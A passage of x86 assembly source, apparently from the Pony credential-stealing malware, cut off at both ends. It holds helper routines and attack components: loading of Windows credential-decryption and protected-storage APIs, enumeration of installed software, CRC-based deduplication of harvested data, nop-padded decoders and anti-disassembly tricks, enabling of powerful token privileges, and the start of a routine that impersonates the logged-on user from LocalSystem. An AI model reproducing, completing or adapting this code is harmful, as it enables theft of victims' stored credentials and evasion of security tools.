	xor     edx, CRCPoly
	xor	edx, 11111111h ; restore hidden polynom dword
@no_xor:
	loop    @l

	mov     dword ptr[CRCTable+eax*4], edx
	inc     al
	jnz     @a_gen
	ret
CRC32BuildTable endp

; Update CRC32 value, initially Crc32 argument should set to 0
CRC32Update proc uses edi _Crc32, Buf, BufLen
	mov     eax, _Crc32
	not     eax
	mov     edi, Buf
	mov     ecx, BufLen
	or	ecx, ecx
	jz	@no_data

@loop:
	mov     edx, eax
	shr     edx, 8
	xor     al, byte ptr[edi]
	and     eax, 0ffh
	mov     eax, dword ptr[CRCTable+eax*4]
	xor     eax, edx
	inc     edi
	loop    @loop

@no_data:
	not     eax
	ret
CRC32Update endp

; Concatenate Str1 + Str2 into new allocated (result) string
PonyStrCat proc uses ebx Str1, Str2
	.IF	!Str1
		mov	Str1, offset szNULL
	.ENDIF
	.IF	!Str2
		mov	Str2, offset szNULL
	.ENDIF
	invoke	lstrlen, Str1
	mov	ebx, eax
	invoke	lstrlen, Str2
	add	ebx, eax	
	inc	ebx
	invoke	MemAlloc, ebx
	mov	ebx, eax
	invoke	lstrcpy, ebx, Str1
	invoke	lstrcat, ebx, Str2
	mov	eax, ebx
	ret
PonyStrCat endp

PonyStrCatFreeArg1 proc uses ebx Str1, Str2
	.IF	!Str1
		mov	Str1, offset szNULL
	.ENDIF
	.IF	!Str2
		mov	Str2, offset szNULL
	.ENDIF	
	invoke	lstrlen, Str1
	mov	ebx, eax
	invoke	lstrlen, Str2
	add	ebx, eax	
	inc	ebx
	invoke	MemAlloc, ebx
	mov	ebx, eax
	invoke	lstrcpy, ebx, Str1
	invoke	lstrcat, ebx, Str2
	.IF	Str1 != offset szNULL
		invoke	MemFree, Str1
	.ENDIF
	mov	eax, ebx
	ret
PonyStrCatFreeArg1 endp

.data

CSHGetFolderPathDll	db	"shell32.dll",0
					db	"SHGetFolderPathA",0
					db	0
MySHGetFolderPathA	dd	0

CShellDirData		dd	offset CShellDirData0
					dd	offset CShellDirData1
					dd	offset CShellDirData2
					dd	offset CShellDirData3
					dd	offset CShellDirData4
					dd	offset CShellDirData5
					dd	offset CShellDirData6
					dd	offset CShellDirData7
					dd	offset CShellDirData8
					dd	offset CShellDirData9
					dd	offset CShellDirData10
					dd	offset CShellDirData11
					dd	offset CShellDirData12
					dd	0
		
CShellDirData0		dd	HKEY_CURRENT_USER, CSIDL_MYDOCUMENTS
					db	'My Documents',0		
CShellDirData1		dd	HKEY_CURRENT_USER, CSIDL_APPDATA
					db	'AppData',0		
CShellDirData2		dd	HKEY_CURRENT_USER, CSIDL_LOCAL_APPDATA
					db	'Local AppData',0
CShellDirData3		dd	HKEY_CURRENT_USER, CSIDL_INTERNET_CACHE
					db	'Cache',0
CShellDirData4		dd	HKEY_CURRENT_USER, CSIDL_COOKIES
					db	'Cookies',0
CShellDirData5		dd	HKEY_CURRENT_USER, CSIDL_HISTORY
					db	'History',0		
CShellDirData6		dd	HKEY_LOCAL_MACHINE, CSIDL_PERSONAL
					db	'My Documents',0		
CShellDirData7		dd	HKEY_LOCAL_MACHINE, CSIDL_COMMON_APPDATA
					db	'Common AppData',0
CShellDirData8		dd	HKEY_CURRENT_USER, CSIDL_MYPICTURES
					db	'My Pictures',0
CShellDirData9		dd	HKEY_LOCAL_MACHINE, CSIDL_COMMON_DOCUMENTS
					db	'Common Documents',0
CShellDirData10		dd	HKEY_LOCAL_MACHINE, CSIDL_COMMON_ADMINTOOLS
					db	'Common Administrative Tools',0
CShellDirData11		dd	HKEY_CURRENT_USER, CSIDL_ADMINTOOLS
					db	'Administrative Tools',0
CShellDirData12		dd	HKEY_CURRENT_USER, CSIDL_PERSONAL
					db	'Personal',0
				
CShellRegPath		db	'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0

.code

SHGetFolderPathStr proc uses edi UID
	LOCAL	s: DWORD
	
	invoke	MemAlloc, MAX_PATH+1
	mov	s, eax
	
	.IF	!MySHGetFolderPathA
		jmp	@fail
	.ENDIF

	push	s
	push	0
	push	0
	push	UID
	push	0
	call	MySHGetFolderPathA
	test	eax, eax
	.IF	!SUCCEEDED
	@fail:
		invoke	MemFree, s
		mov	s, 0
		mov	edi, offset CShellDirData
		.WHILE	dword ptr[edi]
			mov	edx, dword ptr[edi]
			mov	eax, UID
			and	eax, not CSIDL_FLAG_CREATE
			.IF	dword ptr[edx+4] == eax
				invoke	RegReadValueStr, dword ptr[edx], addr CShellRegPath, addr [edx+8], NULL
				.IF	eax
					mov	s, eax
					.BREAK
				.ENDIF
			.ENDIF
			add	edi, 4
		.ENDW
	.ENDIF
	mov	eax, s
	ret
SHGetFolderPathStr endp

FileExists proc uses ebx path
	mov	eax, path
	.IF	!eax || !byte ptr[eax]
		mov	eax, FALSE
		ret
	.ENDIF

	invoke	CreateFile, path, FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, 0
	
	mov	ebx, eax
	sub	eax, eax
	inc	ebx
	jz	@fail
	
	dec	ebx
	invoke	CloseHandle, ebx
	mov	eax, TRUE
	
@fail:
	ret
FileExists endp

DirectoryExists proc path
	mov	eax, path
	.IF	!eax || !byte ptr[eax]
		mov	eax, FALSE
		ret
	.ENDIF
	
	invoke	GetFileAttributes, path
	.IF	eax != INVALID_FILE_ATTRIBUTES
		test	eax, FILE_ATTRIBUTE_DIRECTORY
		setnz	al
		movzx	eax, al
	.ELSE
		mov	eax, FALSE
	.ENDIF   
	ret
DirectoryExists endp

ExpandEnvStr proc path
	LOCAL	s: DWORD
	
	invoke	ExpandEnvironmentStrings, path, NULL, 0
	.IF	eax
		push	eax
		invoke	MemAlloc, eax
		mov	s, eax
		pop	eax
		invoke	ExpandEnvironmentStrings, path, s, eax
		.IF	!eax
			invoke	MemFree, s
			sub	eax, eax
		.ELSE
			mov	eax, s
		.ENDIF 
	.ENDIF
	ret
ExpandEnvStr endp

; Structure for storing info about mapped file, lpMem - valid memory pointer to file data
MappedFile struct DWORD
	hFile           DWORD   ?       ; File handle
	hMap            DWORD   ?       ; Unnamed file-mapping handle 
	lpMem           DWORD   ?       ; Memory pointer to file data
	dwFileSize      DWORD   ?       ; Size of file
MappedFile ends

; Maps file into current process, returns TRUE on success
MapFile proc uses ebx lpszFileName, lpMappedFile
	mov     ebx, lpMappedFile
	assume  ebx: ptr MappedFile

	invoke  ZeroMemory, ebx, sizeof MappedFile
        
	invoke  CreateFile, lpszFileName, GENERIC_READ, FILE_SHARE_READ or FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0
	mov     [ebx].hFile, eax
	inc     eax
	jz      @mf_ret 

	dec		eax
	invoke  GetFileSize, eax, NULL
	mov     [ebx].dwFileSize, eax

	invoke  CreateFileMapping, [ebx].hFile, NULL, PAGE_READONLY, 0, 0, NULL
	.IF     eax        	             
		mov     [ebx].hMap, eax
		invoke  MapViewOfFile, eax, FILE_MAP_READ, 0, 0, 0
		mov     [ebx].lpMem, eax
		
		.IF	!eax
			invoke  CloseHandle, [ebx].hMap
			invoke	CloseHandle, [ebx].hFile
			mov	[ebx].hFile, -1
		.ENDIF
	.ELSE
		invoke	CloseHandle, [ebx].hFile
		mov	[ebx].hFile, -1
	.ENDIF  
        
@mf_ret:
	sub     eax, eax
	cmp     [ebx].lpMem, eax
	setnz   al
        
	assume  ebx: nothing            
	ret
MapFile endp

; Unmaps file from current process
UnmapFile proc uses ebx lpMappedFile
	mov     ebx, lpMappedFile       
	assume  ebx: ptr MappedFile

	.IF     [ebx].hFile != -1
		invoke  UnmapViewOfFile, [ebx].lpMem
		invoke  CloseHandle, [ebx].hMap
		invoke  CloseHandle, [ebx].hFile
	.ENDIF

	assume  ebx: nothing
        ret
UnmapFile endp

FillInstalledList proc uses esi edi 
	LOCAL 	hkHandle: HKEY
	LOCAL	S[4096]: BYTE
	LOCAL	SLen: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	stream: DWORD
	LOCAL	stream2: DWORD
	LOCAL	len: DWORD
	LOCAL	mem: DWORD
	LOCAL	uninstall_path: DWORD
	
	.IF	lpInstalledList
		invoke	MemFree, lpInstalledList
		mov	lpInstalledList, 0
	.ENDIF

	.IF	lpInstalledNames
		invoke	MemFree, lpInstalledNames
		mov	lpInstalledNames, 0
	.ENDIF

	invoke	StreamCreate, addr stream
	invoke	StreamCreate, addr stream2
	
 	invoke	RegOpenKey, HKEY_LOCAL_MACHINE, offset CUninstStr, addr hkHandle
 	.IF	eax == ERROR_SUCCESS
 		mov	KeyIndex, 0
 		
 	@repeat:
 		mov	SLen, 4095
    	invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr S, addr SLen, NULL, NULL, NULL, NULL
    	.IF	eax == ERROR_SUCCESS
    		invoke	PonyStrCat, offset CUninstStr, offset szSlash
    		.IF	eax
    			mov	edx, eax
    			invoke	PonyStrCatFreeArg1, edx, addr S
    			.IF	eax
    				mov	uninstall_path, eax
		    		invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, uninstall_path, offset CUninstValue, addr len
		    		.IF	eax && eax > 1
		    			push	eax
			    			
		    			; uninstall value
		    			invoke	StreamWriteData, stream, eax, len
			    			
		    			; uninstall name
			    		invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, uninstall_path, offset CUninstName, addr len
			    		.IF	eax && len > 1
			    			push	eax
			    			push	eax
				    			
							invoke	lstrlen, addr S
			    			invoke	StreamWriteData, stream2, addr S, eax
				    			
			    			pop	eax				    			
			    			invoke	StreamWriteData, stream2, eax, len
			    			call	MemFree
			    		.ELSE
			    			invoke	lstrlen, addr S
			    			inc	eax
			    			invoke	StreamWriteData, stream2, addr S, eax
			    		.ENDIF
			    			
		    			call	MemFree
		    		.ENDIF
					invoke	MemFree, uninstall_path
    			.ENDIF
    		.ENDIF
	    	inc	KeyIndex
    		jmp	@repeat
    	.ENDIF
   		invoke	RegCloseKey, hkHandle
   	.ENDIF
    	
   	invoke	StreamWriteDWORD, stream, 0
   	invoke	StreamWriteDWORD, stream2, 0
    	
	invoke	GetHGlobalFromStream, stream, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, stream
		mov	len, eax
		
		invoke	MemAlloc, len
		mov	lpInstalledList, eax
		
		invoke	GlobalLock, mem
		.IF	eax
			mov	ecx, len
			mov	esi, eax
			mov	edi, lpInstalledList
			rep movsb
			invoke	GlobalUnlock, mem
		.ENDIF
	.ENDIF
	
	invoke	GetHGlobalFromStream, stream2, addr mem
	test	eax, eax
	.IF	SUCCEEDED
		invoke	StreamGetLength, stream2
		mov	len, eax
		
		invoke	MemAlloc, len
		mov	lpInstalledNames, eax
		
		invoke	GlobalLock, mem
		.IF	eax
			mov	ecx, len
			mov	esi, eax
			mov	edi, lpInstalledNames
			rep movsb
			invoke	GlobalUnlock, mem
		.ENDIF
	.ENDIF
	    	
	invoke	StreamFree, stream
	invoke	StreamFree, stream2   	
 	ret
FillInstalledList endp

DupeAdd proc _crc32
	invoke	MemAlloc, 8
	mov	edx, eax
	m2m	dword ptr[edx], lpDupeArray
	m2m	dword ptr[edx+4], _crc32	
	
	mov	lpDupeArray, edx
	ret
DupeAdd endp

IsDataAlreadyProcessed proc uses edi mem, len
	LOCAL	_crc32: DWORD
	LOCAL	found: DWORD
	
	mov	found, 0
	.IF	mem
		invoke	CRC32Update, 0, mem, len
		mov	_crc32, eax
	.ELSE
		mov	_crc32, 0
	.ENDIF
	
	mov	edi, lpDupeArray
	.WHILE	edi
		mov	eax, _crc32
		.IF	eax == dword ptr[edi+4]
			mov	found, 1
			.BREAK
		.ENDIF
		mov	edi, dword ptr[edi] ; ->Next
	.ENDW
	
	.IF	!found	
		invoke	DupeAdd, _crc32
	.ENDIF
	
	mov	eax, found 	
	ret
IsDataAlreadyProcessed endp

; Clear dupe check array
DupeArrayClear proc uses edi
	mov	edi, lpDupeArray
	.WHILE	edi
		push	edi
		mov	edi, dword ptr[edi] ; ->Next
		call	MemFree
	.ENDW
	mov	lpDupeArray, 0
	ret
DupeArrayClear endp

ExtractFilePath proc uses edi esi lpstr
	invoke	PonyStrCat, lpstr, NULL
	mov	edi, eax
	
	invoke	lstrlen, lpstr
	.IF	eax > 1
		push	edi
		.IF	byte ptr[edi] == '"'
			cld
			lea	esi, [edi+1]
			mov	ecx, eax
			rep movsb
		.ENDIF
		pop	edi
	.ENDIF
	
	invoke	StrStrI, edi, offset szExeExt
	.IF	eax
		mov	byte ptr[eax+4], 0
	.ENDIF
	
	invoke	StrRChrI, edi, NULL, '\'
	.IF	eax
		mov	byte ptr[eax], 0
	.ELSE
		mov	byte ptr[edi], 0
	.ENDIF
	
	invoke	lstrlen, edi
	.IF	eax <= 3
		mov	byte ptr[edi], 0
	.ENDIF
	
	mov	eax, edi
	ret
ExtractFilePath endp

MD5Data PROTO :DWORD, :DWORD, :DWORD

MD5Hash proc lpData, dwLen, outHash
	LOCAL	tmpMem: DWORD

	mov	eax, dwLen
	add	eax, 4096 ; extra size for md5 padding
	invoke	MemAlloc, eax
	mov	tmpMem, eax
	invoke	MoveMem, lpData, tmpMem, dwLen 
	invoke	MD5Data, tmpMem, dwLen, outHash
	invoke	MemFree, tmpMem
	ret
MD5Hash endp 

LoadDllImports proc uses esi ebx edi szLib, dwFuncs
	invoke  LoadLibrary, szLib
	nop
	.IF	!eax
    	ret
	.ENDIF

	mov     edi, szLib
	nop
	mov     ebx, eax
	nop
	mov     esi, dwFuncs

@@:
	sub     eax, eax
	cld
	mov     ecx, -1
	nop
	repnz scasb
	nop                
	cmp     byte ptr[edi], 0
	jz      @F
	invoke  GetProcAddress, ebx, edi
	.IF     !eax
		ret
	.ENDIF
	mov     dword ptr[esi], eax
	add     esi, 4
	jmp     @B
@@:
	mov     eax, 1
	ret
LoadDllImports endp

LoadLibs proc
	invoke	LoadDllImports, offset COle32Dll, offset MyStgOpenStorage
	invoke	LoadDllImports, offset CCryptApi32Dll, offset MyCryptUnprotectData
	invoke	LoadDllImports, offset CAdvapi32Dll, offset MyAllocateAndInitializeSid
	invoke	LoadDllImports, offset CSHGetFolderPathDll, offset MySHGetFolderPathA
	invoke	LoadDllImports, offset CNetApi32Dll, offset MyNetApiBufferFree
	invoke	LoadDllImports, offset CKernel32Dll, offset MyWTSGetActiveConsoleSessionId
	invoke	LoadDllImports, offset CMsiDll, offset MyMsiGetComponentPath
	invoke	LoadDllImports, offset CPStorageLib, offset MyPStoreCreateInstance
	invoke	LoadDllImports, offset CUserenvDll, offset MyCreateEnvironmentBlock
	ret
LoadLibs endp

; Check if a null-terminated string ends with slash either '\' or '/'
CheckEndSlash proc dir
	mov	eax, dir
	.IF	(!eax) || (!byte ptr[eax])
		mov	eax, FALSE
		ret
	.ENDIF
	sub	edx, edx
	.WHILE	byte ptr[eax]
		.IF	byte ptr[eax] == '\' || byte ptr[eax] == '/'
			mov	edx, TRUE
		.ELSE
			mov	edx, FALSE	
		.ENDIF
		inc	eax
	.ENDW
	mov	eax, edx
	ret
CheckEndSlash endp

; Process text buffer with '\n' delimiters and split it into null-terminated strings
ProcessStringList proc uses edi esi ebx lpMem, dwLen
	mov	eax, dwLen
	add	eax, 1024
	shl	eax, 1
	invoke	MemAlloc, eax
	mov	edi, eax
	mov	ebx, eax
	mov	esi, lpMem
	mov	ecx, dwLen

@@:
	.WHILE	ecx && (byte ptr[esi] != 10)
		movsb
		dec	ecx
	.ENDW
	
	.IF	ecx
		movsb
		dec	ecx
	.ENDIF
	
	sub	eax, eax
	stosb
	test	ecx, ecx
	jnz	@B

	mov	eax, ebx
	ret
ProcessStringList endp

; IN: esi - 4 packed bytes
; OUT: eax - 3 unpacked bytes, ecx - unpacked len (<= 3)
DecodeChunk proc
	push	ebx
	push	esi
	mov	ecx, 4
	nop
	xor	edx, edx
	nop
	xor	ebx, ebx
	nop

@l:
	lodsb
	nop
	movzx	eax, al
	nop
	cmp	al, '+'
	nop
	jnz	@1
	nop
	add	edx, 62
	nop
	inc	ebx

@1:
	cmp	al, '/'
	nop
	jnz	@2
	nop
	add	edx, 63
	nop
	inc	ebx

@2:
	cmp	al, '0'
	nop
	jl	@3
	cmp	al, '9'
	nop
	jg	@3
	add	al, 4
	add	edx, eax
	inc	ebx

@3:
	cmp	al, 'A'
	nop
	jl	@4
	cmp	al, 'Z'
	nop
	jg	@4
	sub	al, 'A'
	nop
	add	edx, eax
	inc	ebx

@4:
	cmp	al, 'a'
	nop
	jl	@5
	cmp	al, 'z'
	nop
	jg	@5
	sub	al, 71
	add	edx, eax
	inc	ebx

@5:
	rol	edx, 6
	loop	@l
	ror	edx, 6

	mov	eax, edx
	bswap	eax
	shr	eax, 8
	dec	ebx
	nop
	mov	ecx, ebx
	nop
	pop	esi
	pop	ebx
	ret
DecodeChunk endp

Base64Decode proc Input, Len, Output
	push	ebx
	push	edi
	push	esi
	cld
	mov	esi, Input
	nop
	mov	edi, Output
	nop
	mov	ecx, Len
	nop
	xor	ebx, ebx

	jecxz	@exit

@l:
	nop
	push	ecx
	nop
	call	DecodeChunk
	nop
	test	ecx, ecx
	jle	@l3

@l2:
	stosb
	shr	eax, 8
	nop
	inc	ebx
	loop	@l2

@l3:
	nop
	pop	ecx
	nop
	add	esi, 4
	nop
	sub	ecx, 4
	nop
	jg	@l

@exit:
	nop
	mov	eax, ebx
	nop
	pop	esi
	pop	edi
	pop	ebx
	ret
Base64Decode endp

; SEH (exception handling) macros

IFNDEF SEH
SEH struct
	PrevLink	dd ?
	CurrentHandler	dd ?
	SafeOffset	dd ?
	PrevEsp		dd ?
	PrevEbp		dd ?
SEH ends
ENDIF

__try macro exceptionid
	assume fs:nothing
	push fs:[0]
	mov eax,esp
	push fs:[0]
	push ebp
	push eax
	push __finally_&exceptionid
	push __exception_&exceptionid
	push eax
	mov fs:[0],esp
	assume fs:ERROR
endm

__catch macro exceptionid
	add esp,sizeof SEH+4
	jmp __finally_&exceptionid
	__exception_&exceptionid:
	push ebp
	mov ebp,esp
	mov edx,[ebp][12]
	assume edx:ptr SEH
	mov eax,[ebp][16]
	assume eax:ptr CONTEXT
	push [edx].SafeOffset
	pop [eax].regEip
	push [edx].PrevEsp
	pop [eax].regEsp
	push [edx].PrevEbp
	pop [eax].regEbp
	
	assume edx:nothing
	assume eax:nothing
endm

__finally macro exceptionid
	mov eax,ExceptionContinueExecution
	pop ebp
	retn 16+sizeof SEH
	__finally_&exceptionid:
	assume fs:nothing
	pop fs:[0]
	assume fs:error
endm

; Read application option
; tries to read from registry first, if it fails it reads data from a file
WriteAppOptionValue proc uses ebx szValueName, lpData, dwDataLen
	LOCAL	hkKey: HKEY
	LOCAL	hFile: DWORD
	LOCAL	szTempPath[MAX_PATH+1]: BYTE
	LOCAL	file_name: DWORD
	
	sub	ebx, ebx
	invoke	RegCreateKey, dwCurrentUserKey, offset szAppMainRegPath, addr hkKey
	.IF	eax == ERROR_SUCCESS
		invoke	RegSetValueEx, hkKey, szValueName, 0, REG_BINARY, lpData, dwDataLen
		.IF	eax == ERROR_SUCCESS
			inc	ebx
		.ENDIF
		invoke	RegCloseKey, hkKey
	.ENDIF
	.IF	!ebx
		; Failed to write to registry, try to write into temp file
		invoke	GetTempPath, MAX_PATH, addr szTempPath
		.IF	eax && eax <= MAX_PATH
			invoke	CreateDirectory, addr szTempPath, NULL
			invoke	CheckEndSlash, addr szTempPath
			.IF	!eax
				invoke	PonyStrCat, addr szTempPath, offset szSlash
				invoke	PonyStrCatFreeArg1, eax, szValueName
			.ELSE
				invoke	PonyStrCat, addr szTempPath, szValueName
			.ENDIF
			mov	file_name, eax
			invoke  CreateFile, file_name, GENERIC_WRITE or GENERIC_READ, FILE_SHARE_WRITE or FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, 0
			mov	hFile, eax
			inc	eax
			.IF	!ZERO?
				invoke	SafeWrite, hFile, lpData, dwDataLen
				mov	ebx, eax
				invoke	CloseHandle, hFile
			.ENDIF
			.IF	!ebx
				invoke	DeleteFile, file_name
			.ENDIF
			invoke	MemFree, file_name
		.ENDIF
	.ENDIF
	mov	eax, ebx
	ret
WriteAppOptionValue endp

; Write application option
; tries to write data into registry first, if it fails it writes data to a file
ReadAppOptionValue proc uses ebx szValueName, lpdwDataLen
	LOCAL	stream: DWORD
	LOCAL	len: DWORD
	LOCAL	mem: DWORD
	LOCAL	szTempPath[MAX_PATH+1]: BYTE

	invoke	RegReadValueStr, dwCurrentUserKey, offset szAppMainRegPath, szValueName, lpdwDataLen
	.IF	!eax
		; Failed to read from registry, try to read from temp file
		sub	ebx, ebx		
		invoke	GetTempPath, MAX_PATH, addr szTempPath
		.IF	eax && eax <= MAX_PATH
			invoke	StreamCreate, addr stream
			invoke	CheckEndSlash, addr szTempPath
			.IF	!eax
				invoke	PonyStrCat, addr szTempPath, offset szSlash
				invoke	PonyStrCatFreeArg1, eax, szValueName
			.ELSE
				invoke	PonyStrCat, addr szTempPath, szValueName
			.ENDIF
			push	eax
			invoke	StreamLoadFromFile, eax, stream
			.IF	eax
				invoke	StreamGetLength, stream
				mov	len, eax
				.IF	len
					invoke	GetHGlobalFromStream, stream, addr mem
					test	eax, eax
					.IF	SUCCEEDED
						invoke	GlobalLock, mem
						.IF	eax
							push	eax
							invoke	MemAlloc, len
							mov	ebx, eax
							pop	eax
							invoke	MoveMem, eax, ebx, len
							invoke	GlobalUnlock, mem
							mov	eax, lpdwDataLen
							m2m	dword ptr[eax], len
						.ENDIF
					.ENDIF
				.ENDIF
			.ENDIF
			call	MemFree
			invoke	StreamFree, stream
		.ENDIF
		mov	eax, ebx
	.ENDIF
	ret
ReadAppOptionValue endp

; Trim null-terminated string on both sides
Trim proc uses edi text_string
	; Left trim
	mov	edi, text_string
	.WHILE	(byte ptr[edi] == ' ') || (byte ptr[edi] == 13) || (byte ptr[edi] == 10) || (byte ptr[edi] == 9)
		push	edi
		.WHILE	byte ptr[edi]
			mov	al, byte ptr[edi+1]
			mov	byte ptr[edi], al
			inc	edi
		.ENDW
		pop	edi
		dec	edi
		inc	edi
	.ENDW
	
	mov	edi, text_string
	
	; Right trim
@@:
	invoke	lstrlen, text_string
	.IF	eax > 0
		.IF	(byte ptr[edi+eax-1] == ' ') || (byte ptr[edi+eax-1] == 13) || (byte ptr[edi+eax-1] == 10) || (byte ptr[edi+eax-1] == 9)
			mov	byte ptr[edi+eax-1], 0
		.ELSE
			jmp	@F
		.ENDIF
		jmp	@B
	.ENDIF
@@:
	ret
Trim endp

EnablePrivilege proc uses ebx szPriv, fEnabled
	LOCAL	luid: LUID
	LOCAL	hToken: DWORD
	LOCAL	tp: TOKEN_PRIVILEGES

	.IF	!MyLookupPrivilegeValue || !MyAdjustTokenPrivileges || !MyOpenProcessToken
		sub	eax, eax
		ret
	.ENDIF

	sub	ebx, ebx

	mov	hToken, NULL

	; First lookup the system unique luid for the privilege
	lea	eax, luid
	push	eax
	push	szPriv
	push	NULL
	call	MyLookupPrivilegeValue
	.IF	eax
		invoke	GetCurrentProcess
        ; Then get the processes token
        mov	edx, eax
        lea	eax, hToken
        push	eax
        push	TOKEN_ADJUST_PRIVILEGES
        push	edx
        call	MyOpenProcessToken
        .IF		eax
        	mov	tp.PrivilegeCount, 1
        	m2m	tp.Privileges[0].Luid.LowPart, luid.LowPart
        	m2m	tp.Privileges[0].Luid.HighPart, luid.HighPart
        	.IF	fEnabled
        		mov	tp.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED
			.ELSE
				mov	tp.Privileges[0].Attributes, 0
        	.ENDIF
        .ENDIF

        push	NULL
        push	NULL
        push	sizeof TOKEN_PRIVILEGES
        lea	eax, tp
        push	eax
        push	FALSE
        push	hToken
        call	MyAdjustTokenPrivileges
        .IF	eax
        	inc	ebx
		.ENDIF
	.ENDIF

	.IF	hToken
		invoke	CloseHandle, hToken
	.ENDIF

	mov	eax, ebx

	ret
EnablePrivilege endp

lstrdup proc lpStr
	invoke	lstrlen, lpStr
	inc	eax
	invoke	MemAlloc, eax
	push	eax
	invoke	lstrcpy, eax, lpStr
	pop	eax
	ret
lstrdup endp

; UnicodeStrLen - length of source (UnicodeStr) wide string in UNICODE CHARS
UnicodeToAnsiLen proc uses ebx UnicodeStr, UnicodeStrLen
	LOCAL	dwStrLen: DWORD

	.IF	!UnicodeStr
		sub	eax, eax
		ret
	.ENDIF

	sub	ebx, ebx
	invoke	WideCharToMultiByte, CP_ACP, 0, UnicodeStr, UnicodeStrLen, NULL, 0, NULL, NULL
	.IF	eax
		mov	dwStrLen, eax
		invoke	MemAlloc, dwStrLen
		.IF	eax
			mov	ebx, eax
    		invoke	WideCharToMultiByte, CP_ACP, 0, UnicodeStr, UnicodeStrLen, ebx, dwStrLen, NULL, NULL
    		.IF	!eax
    			invoke	MemFree, ebx
    			sub	ebx, ebx
    		.ENDIF
		.ENDIF
	.ENDIF
	mov	eax, ebx
	ret
UnicodeToAnsiLen endp

UnicodeToAnsi proc UncicodeStr
	invoke	UnicodeToAnsiLen, UncicodeStr, -1
	ret
UnicodeToAnsi endp

UnkTextToAnsi proc UnkStr, StrByteLen
	.IF	!StrByteLen || !UnkStr
		sub	eax, eax
		ret
	.ENDIF

	invoke	IsTextUnicode, UnkStr, StrByteLen, NULL
	.IF	eax
		; Convert UNICODE -> ANSI
		shr	StrByteLen, 1
		invoke	UnicodeToAnsiLen, UnkStr, StrByteLen
	.ELSE
		; Return ANSI duplicate string
		mov	eax, StrByteLen
		inc	eax
		invoke	MemAlloc, eax
		push	eax
		invoke	MoveMem, UnkStr, eax, StrByteLen
		pop	eax
	.ENDIF
	ret
UnkTextToAnsi endp

; lpHexStr - input/output hex-encoded string to be decoded
; dwStrLen - length of input string in bytes
; Returns TRUE on success, FALSE - on errors (invalid hex char, invalid length, ...)
DecodeHexString proc uses esi edi ebx lpHexStr, dwStrLen
	.IF	!lpHexStr
		sub	eax, eax
		ret
	.ENDIF

	; check length parity
	mov	eax, dwStrLen
	and	eax, 1
	.IF	eax
		sub	eax, eax
		ret
	.ENDIF

	mov	ebx, dwStrLen
	mov	esi, lpHexStr
	mov	edi, esi
	; decode hex string
	.WHILE	ebx
		mov	ax, word ptr[esi]
		.IF	ah >= '0' && ah <= '9'
			sub	ah, '0'
		.ELSEIF	ah >= 'A' && ah <= 'F'
			sub	ah, 'A'
			add	ah, 0ah
		.ELSEIF ah >= 'a' && ah <= 'f'
			sub	ah, 'a'
			add	ah, 0ah
		.ELSE
			sub	eax, eax
			ret
		.ENDIF
		.IF	al >= '0' && al <= '9'
			sub	al, '0'
		.ELSEIF	al >= 'A' && al <= 'F'
			sub	al, 'A'
			add	al, 0ah
		.ELSEIF	al >= 'a' && al <= 'f'
			sub	al, 'a'
			add	al, 0ah
		.ELSE
			sub	eax, eax
			ret
		.ENDIF
		shl	al, 4
		or	al, ah
		stosb
		dec	ebx
		dec	ebx
		add	esi, 2
	.ENDW
	mov	eax, TRUE
	ret
DecodeHexString endp

.data
	szExplorerProcessName	db	'explorer.exe',0
	szLocalSystemSid		db	'S-1-5-18',0
	IsProcessImpersonated	dd	FALSE
	CRequiredImpersonationPrivileges db	'SeImpersonatePrivilege',0
						db	'SeTcbPrivilege',0
						db	'SeChangeNotifyPrivilege',0
						db	'SeCreateTokenPrivilege',0
						db	'SeBackupPrivilege',0
						db	'SeRestorePrivilege',0
						db	'SeIncreaseQuotaPrivilege',0
						db	'SeAssignPrimaryTokenPrivilege',0
						db	0

.code

EnableRequiredImpersonationPrivileges proc uses edi ebx
	AntiDisasmTrick

	mov	ebx, TRUE
	mov	edi, offset CRequiredImpersonationPrivileges
@next_privilege:
	invoke	EnablePrivilege, edi, TRUE
	and	ebx, eax
	@Next	@next_privilege
	mov	eax, ebx
	ret
EnableRequiredImpersonationPrivileges endp

; Check if current user is running under LocalSystem (service) account
IsProcessRunningUnderLocalSystem proc uses ebx
	LOCAL	hToken: DWORD
	LOCAL	TokenInfoLen: DWORD
	LOCAL	TokenData: DWORD
	LOCAL	StringSid: DWORD

	AntiDisasmTrick

	.IF	!MyOpenProcessToken || !MyGetTokenInformation || !MyConvertSidToStringSid
		sub	eax, eax
		ret
	.ENDIF

	sub	ebx, ebx

	invoke	GetCurrentProcess

	lea	edx, hToken
	push	edx
	push	TOKEN_QUERY
	push	eax
	call	MyOpenProcessToken
	.IF	eax
		; Allocate buffer for token Sid information
		mov	TokenInfoLen, 0
		lea	eax, TokenInfoLen
		push	eax
		push	0
		push	NULL
		push	TokenUser
		push	hToken
		call	MyGetTokenInformation
		.IF	!eax
			invoke	GetLastError
			.IF	eax == ERROR_INSUFFICIENT_BUFFER && TokenInfoLen
				invoke	MemAlloc, TokenInfoLen
				mov	TokenData, eax

				; Retrieve token Sid
				lea	eax, TokenInfoLen
				push	eax
				push	TokenInfoLen
				push	TokenData
				push	TokenUser
				push	hToken
				call	MyGetTokenInformation
				.IF	eax
					mov	eax, TokenData
					mov	edx, [eax].SID_AND_ATTRIBUTES.Sid
					; Convert Sid into a string
					lea	eax, StringSid
					push	eax
					push	edx
					call	MyConvertSidToStringSid
					.IF	eax
						; Compare current process Sid with well-known LocalSystem user Sid
						invoke	lstrcmp, StringSid, offset szLocalSystemSid
						.IF	!eax
							inc	ebx
						.ENDIF
						invoke	LocalFree, StringSid
					.ENDIF
				.ENDIF
				invoke	MemFree, TokenData
			.ENDIF
		.ENDIF

		invoke	CloseHandle, hToken
	.ENDIF

	mov	eax, ebx
	ret
IsProcessRunningUnderLocalSystem endp

; Impersonate current process running under LocalSystem account into active (logged on) user
; this type of impersonation does not require knowing the password of the logged on user
; On success impersonated user token will be stored into lpUserToken
ImpersonateLocalSystemUser proc uses ebx lpUserToken
	LOCAL	hToken: DWORD
	LOCAL	hProcess: DWORD
	LOCAL	dwActiveConsoleSessId: DWORD
